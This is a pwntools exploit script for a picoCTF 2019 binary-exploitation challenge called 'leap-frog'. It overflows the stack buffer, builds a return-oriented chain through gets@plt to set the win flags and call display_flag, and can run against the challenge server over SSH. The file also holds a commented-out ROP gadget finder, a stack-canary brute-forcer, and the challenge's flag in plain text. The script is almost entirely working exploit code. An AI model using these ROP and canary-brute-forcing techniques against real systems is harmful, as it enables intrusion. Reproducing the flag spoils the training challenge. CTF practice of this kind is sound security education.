from pwn import *
import sys
import subprocess
# flag: picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_f60266f9}

argv = sys.argv

DEBUG = True
BINARY = './rop'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

# if context.bits == 64:
#   r = process(['ROPgadget', '--binary', BINARY])
#   gadgets = r.recvall().strip().split('\n')[2:-2]
#   gadgets = map(lambda x: x.split(' : '),gadgets)
#   gadgets = map(lambda x: (int(x[0],16),x[1]),gadgets)
#   r.close()

#   pop_rdi = 0
#   pop_rsi_r15 = 0
#   pop_rdx = 0

#   for addr, name in gadgets:
#     if 'pop rdi ; ret' in name:
#       pop_rdi = addr
#     if 'pop rsi ; pop r15 ; ret' in name:
#       pop_rsi_r15 = addr
#     if 'pop rdx ; ret' in name:
#       pop_rdx = addr

#   def call(f, a1, a2, a3):
#     out = ''
#     if a1 != None:
#       out += p64(pop_rdi)+p64(a1)
#     if a2 != None:
#       out += p64(pop_rsi_r15)+p64(a2)*2
#     if a3 != None:
#       if pop_rdx == 0:
#         print 'RDX GADGET NOT FOUND'
#         exit(-1)
#       else:
#         out += p64(rdx)+p64(a3)
#     return out+p64(f)

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'error'


def start():
  global sh
  if len(argv) < 2:
    stdout = process.PTY
    stdin = process.PTY

    sh = process(BINARY, stdout=stdout, stdin=stdin)

    if DEBUG:
      attach_gdb()

    REMOTE = False
  else:
    s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")
    sh = s.process('rop', cwd='/problems/leap-frog_1_2944cde4843abb6dfd6afa31b00c703c')
    REMOTE = True

# key = ''
# for i in range(4):
#   for c in range(256):
#     start()
#     c = chr(c)
#     sh.sendlineafter('> ', str(33+i))
#     sh.sendlineafter('> ', 'a'*32+key+c)
#     data = sh.recvall()
#     if 'Stack Smashing Detected' not in data:
#       key += c
#       print enhex(key)
#       break
#   else:
#     print 'error'
#     exit()


main_addr = 0x80487c9
gets_plt = 0x08048430
win1_addr = 0x0804A03D
display_flag_addr = 0x080486b3

start()
payload = 'a'*28
payload += p32(gets_plt)
payload += p32(display_flag_addr)
payload += p32(win1_addr)
# payload += p32(0x38c0)[:-2]
sh.sendlineafter('> ', payload)
sh.sendline('\x01'*3)
sh.interactive()